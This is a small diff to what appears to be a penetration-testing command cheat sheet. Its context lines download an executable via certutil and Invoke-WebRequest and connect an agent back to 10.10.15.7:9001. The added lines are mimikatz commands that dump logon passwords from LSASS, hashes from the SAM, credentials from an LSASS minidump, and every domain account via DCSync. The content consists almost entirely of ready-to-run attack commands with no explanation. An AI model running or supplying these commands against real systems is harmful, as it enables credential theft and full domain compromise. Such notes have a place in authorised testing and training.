@@ -39,3 +39,15 @@ certutil -urlcache -split -f "http://example.com/file.exe" file.exe
 Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "file.exe"
 
 ./agent -connect 10.10.15.7:9001 -ignore-cert
+
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
+
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
+
+
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:example.com /all /csv" "exit"
+
+
+
